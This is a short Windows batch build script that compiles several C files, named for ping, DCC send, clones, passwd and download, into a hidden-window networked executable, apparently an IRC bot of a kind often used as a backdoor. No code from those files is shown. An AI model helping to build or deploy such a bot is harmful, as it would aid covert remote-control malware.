SET PATH=C:\mingw\bin;%PATH%
gcc.exe -o gnu.exe main.c ping.c dccsend.c oj.c passwd.c clones.c download.c -lwsock32 -lwininet -mwindows
